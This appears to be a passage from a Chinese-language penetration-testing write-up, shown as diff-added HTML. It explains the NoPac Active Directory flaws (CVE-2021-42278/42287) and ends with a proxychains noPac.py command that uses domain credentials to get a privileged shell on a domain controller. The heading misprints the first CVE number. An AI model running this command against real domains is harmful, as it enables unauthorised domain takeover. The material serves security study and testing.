+<h3 data-content="1" id="49e9cffcc90c08bde811f0e92de11de3">CVE-2021-4227&amp;CVE-2021-42287(NoPac)</h3>
+<p>CVE-2021-42278 是一个安全绕过漏洞，允许通过修改机器账户的sAMAccountName属性来冒充域控制器。与标准用户账户相比，机器账户的名称末尾附加了“$”符号，但实际中，AD并没有验证域内机器账户中是否具有“$”，导致机器账户可以被假冒。</p>
+<p>CVE-2021-42287是影响Kerberos特权属性证书(PAC)的安全绕过漏洞，允许通过假冒域控制器，使密钥分发中心(KDC)创建高权限票据。</p>
+<p>根据认证 Kerberos 协议，在请求服务票证前需要先签发 TGT(票据授权凭证)。但是，当为活动目录中不存在的账户请求服务票证时，密钥分发中心(KDC)将在该账户名上附加“$”符号进行搜索。将这一行为与 CVE-2021-42278 结合，测试人员可以实现域内权限提升</p>
+<div class="highlight"><pre><span></span>proxychains python3 noPac.py <span class="o">-</span>use<span class="o">-</span>ldap test.com<span class="o">/</span>ceshi<span class="o">:</span><span class="s">'test!@#123'</span> <span class="o">-</span>dc<span class="o">-</span>ip <span class="m">10.0.10.5</span> <span class="o">-</span>shell
+</pre></div>
+</div>
+</div>
